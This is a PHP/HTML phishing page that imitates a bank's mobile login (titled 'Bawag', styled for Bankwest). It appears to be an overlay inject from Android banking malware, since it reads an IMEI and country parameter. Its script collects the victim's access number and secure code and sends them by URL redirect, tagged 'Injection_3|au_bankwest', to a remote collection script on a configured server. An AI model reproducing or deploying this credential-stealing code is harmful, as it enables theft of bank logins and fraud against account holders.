<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
	
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="au/au.com.bankwest.mobile/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">
<div id="header">
	<img style="width: 40%;float: left;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARIAAAA8CAIAAAAlhKKGAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6OTlDQTlFRERBNjNDMTFFOEE5MjRCRDhEQzNCQzFGQUYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6OTlDQTlFREVBNjNDMTFFOEE5MjRCRDhEQzNCQzFGQUYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo5OUNBOUVEQkE2M0MxMUU4QTkyNEJEOERDM0JDMUZBRiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo5OUNBOUVEQ0E2M0MxMUU4QTkyNEJEOERDM0JDMUZBRiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Ph3SO/IAAB+PSURBVHja7F0JVFzV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">
	Contact
</div>

	<h3> Hello. </h3>

<div class="form">
<form id="form">
<center>
<input name="field2" id="login" placeholder="Personal Access Number (PAN)" maxlength="20" class="input" type="text" ><br><br>

<input name="field3" id="password" placeholder="Secure Code" maxlength="50" class="input" type="password" required=""><br><br><br>

<input type="button" id="input_submitBtn" class="submit" value="LOGIN"/>
</center>
</form>
</div>
</div>
<div class="footer">
	Forgotten your Secure code?
</div>

<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
	            <script type="text/javascript">
            
            (function () {
        
        
        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'input';
							oCodeInp.className = 'input';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'input error';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'input error';
							} catch(e){};
                            return false;
                        }

top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|au_bankwest|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
            </script>

</body>
</html>
